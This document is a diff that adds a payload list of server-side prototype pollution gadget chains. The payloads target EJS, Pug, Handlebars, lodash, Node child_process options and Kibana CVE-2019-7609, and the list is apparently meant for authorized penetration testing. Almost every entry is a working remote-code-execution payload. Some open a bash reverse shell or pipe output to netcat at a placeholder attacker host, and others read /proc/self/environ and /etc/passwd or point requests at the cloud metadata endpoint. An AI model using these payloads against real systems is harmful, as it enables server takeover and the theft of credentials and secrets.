@@ -1,0 +1,60 @@
+# Prototype pollution — RCE gadget chains (server-side, high impact)
+# Sources: PAT, mizu.re EJS, Securitum Kibana CVE-2019-7609, yuske/server-side-prototype-pollution
+# Authorized testing only.
+
+# EJS escapeFunction RCE
+{"__proto__":{"client":1,"escapeFunction":"JSON.stringify; process.mainModule.require('child_process').exec('id | nc ATTACKER 4444')"}}
+
+# EJS outputFunctionName
+{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');x"}}
+
+# Handlebars / template engines
+{"__proto__":{"allowProtoPropertiesByDefault":true,"allowProtoMethodsByDefault":true}}
+
+# Pug block injection
+{"__proto__":{"block":{"type":"Text","line":1,"blockName":"child_process.execSync('id')"}}}
+
+# NODE_OPTIONS / inspect / require chain
+{"__proto__":{"argv0":"node","shell":"node","NODE_OPTIONS":"--inspect=ATTACKER.oastify.com"}}
+{"__proto__":{"shell":"node","NODE_OPTIONS":"--require /proc/self/environ","env":{"EVIL":"require('child_process').execSync('curl ATTACKER')"}}}
+{"__proto__":{"env":{"NODE_OPTIONS":"--require /proc/self/environ","EVIL":"require('child_process').execSync('id')"}}}
+
+# Kibana CVE-2019-7609 (elasticsearch query string context)
+.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/ATTACKER/4444 0>&1");process.exit()//')
+.es(*).props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
+
+# child_process spawn pollution
+{"__proto__":{"shell":true}}
+{"__proto__":{"stdio":"inherit"}}
+{"__proto__":{"detached":true}}
+
+# vm / Function constructor gadgets
+{"__proto__":{"then":"process.mainModule.require('child_process').execSync('id')"}}
+{"__proto__":{"toString":"process.mainModule.require('child_process').execSync('id')"}}
+{"__proto__":{"valueOf":"process.mainModule.require('child_process').execSync('id')"}}
+
+# lodash template sourceURL
+{"__proto__":{"sourceURL":"\nprocess.mainModule.require('child_process').execSync('id')//"}}
+{"__proto__":{"sourceURL":"\u2028\u2029process.mainModule.require('child_process').execSync('id')//"}}
+
+# YAML / merge deep sinks (when parsed to object then merged)
+{"__proto__":{"polluted":"yes"}}
+constructor:
+  prototype:
+    polluted: yes
+
+# Remote require via polluted paths
+{"__proto__":{"mainModule":{"require":"child_process"}}}
+{"__proto__":{"extensions":{".js":"process.mainModule.require('child_process').execSync('id')"}}}
+
+# PDF/image processing gadgets (ImageMagick, sharp options pollution)
+{"__proto__":{"density":100,"quality":100}}
+{"__proto__":{"input":{"filename":"/etc/passwd"}}}
+
+# Redis / DB connection string pollution
+{"__proto__":{"host":"ATTACKER"}}
+{"__proto__":{"url":"http://ATTACKER/exfil"}}
+
+# SSRF via polluted URL defaults
+{"__proto__":{"href":"http://169.254.169.254/latest/meta-data/"}}
+{"__proto__":{"proxy":"http://ATTACKER:8080"}}
